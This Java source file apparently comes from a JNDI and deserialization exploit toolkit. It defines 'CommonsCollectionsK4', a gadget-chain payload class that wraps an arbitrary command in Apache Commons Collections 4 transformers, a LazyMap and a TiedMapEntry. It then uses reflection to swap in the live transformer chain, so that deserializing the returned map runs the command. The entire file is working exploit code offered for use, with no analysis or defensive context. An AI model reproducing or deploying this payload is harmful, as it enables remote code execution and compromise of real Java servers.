package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:4.0"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollectionsK4 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        Transformer[]       fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        final Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
        Transformer         transformerChain = new ChainedTransformer(fakeTransformers);
        Map                 innerMap         = new HashMap();
        Map                 outerMap         = LazyMap.lazyMap(innerMap, transformerChain);
        TiedMapEntry        tme              = new TiedMapEntry(outerMap, "QI4L");
        Map                 expMap           = new HashMap();
        expMap.put(tme, "QI4L");
        outerMap.remove("QI4L");

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return expMap;
    }
}
